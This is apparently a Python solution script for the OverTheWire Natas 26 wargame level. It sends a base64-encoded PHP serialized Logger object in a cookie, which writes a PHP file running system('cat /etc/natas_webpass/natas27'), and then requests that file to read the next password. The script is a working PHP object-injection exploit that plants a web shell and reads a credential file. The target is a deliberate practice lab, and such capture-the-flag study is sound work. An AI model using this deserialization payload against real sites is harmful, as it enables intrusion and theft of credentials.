#!/usr/bin/python3
# Time: 2019/04/23 8:49 PM



import requests
import base64
import codecs
import urllib

username = 'natas26'
password = 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'
url = f'http://{username}.natas.labs.overthewire.org/'
s = requests.Session()

resp = s.get(url, auth=(username, password))
# print(resp.text)

# print(s.cookies)

# Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30=
# Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo0MzoiIHN5c3RlbSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ICI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjQzOiIgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgIjt9
# s.cookies["drawing"] = "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo0MzoiIHN5c3RlbSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ICI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjQzOiIgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgIjt9"
s.cookies["drawing"] = "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30"
resp2 = s.get(url + "?x1=1&y1=1&x2=500&y2=500", auth=(username, password))
# print(resp2.text)

print("**"*50)

resp3 = s.get(url + "img/winner.php", auth=(username, password))
print(resp3.text)

# info = base64.b64decode(urllib.parse.unquote(s.cookies["drawing"]))
# print(info)
# b'a:1:{i:0;a:4:{s:2:"x1";s:1:"1";s:2:"y1";s:1:"1";s:2:"x2";s:3:"500";s:2:"y2";s:3:"500";}}'



